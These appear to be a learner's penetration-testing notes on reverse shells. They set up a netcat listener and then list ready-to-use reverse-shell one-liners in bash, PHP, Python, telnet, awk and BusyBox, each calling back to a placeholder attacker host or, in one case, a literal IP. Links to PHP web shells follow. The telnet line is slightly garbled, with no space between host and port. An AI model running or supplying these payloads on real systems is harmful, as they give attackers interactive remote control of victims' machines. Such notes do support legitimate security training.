- connection initiates from target system to attacker's machine
- help avoid detection from firewalls and security apps
- Setup netcat listener
```shell-session
nc -lvnp 443
```
- -v: verbose
- -l: listen/wait for connection
- -n: prevent use of DNS lookup
- -p to indicate port
- start reverse shell using payload
	- Ex:
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```


## Shell Payloads: 

**Normal Bash Reverse Shell**
```shell-session
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```

**Bash Read Line** **Reverse Shell**
```shell-session
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

**Bash With File Descriptor 196** **Reverse Shell**
```shell-session
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```

**Bash With File Descriptor 5** **Reverse Shell**
```shell-session
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

**PHP Reverse Shell Using the exec Function**
```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```

**PHP Reverse Shell Using the shell_exec Function**
```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

**PHP Reverse Shell Using the system Function**
```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```

**PHP Reverse Shell Using the passthru Function**
```shell-session
 php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

**PHP Reverse Shell Using the popen Function**
```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```

**Python Reverse Shell by Exporting Environment Variables**
```shell-session
 export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```

**Python Reverse Shell Using the subprocess Module**
```shell-session
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

**Short Python Reverse Shell**
```shell-session
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

**Telnet**
```shell-session
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

**AWK**
```shell-session
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**BusyBox**
```shell-session
busybox nc ATTACKER_IP 443 -e sh
```

Web shells:
- [p0wny-shell](https://github.com/flozz/p0wny-shell), single file PHP
- [b374k shell](https://github.com/b374k/b374k), more features with file management and command eecutions
- [c99 shell](https://www.r57shell.net/single.php?id=13), well-known and robust PHP web shell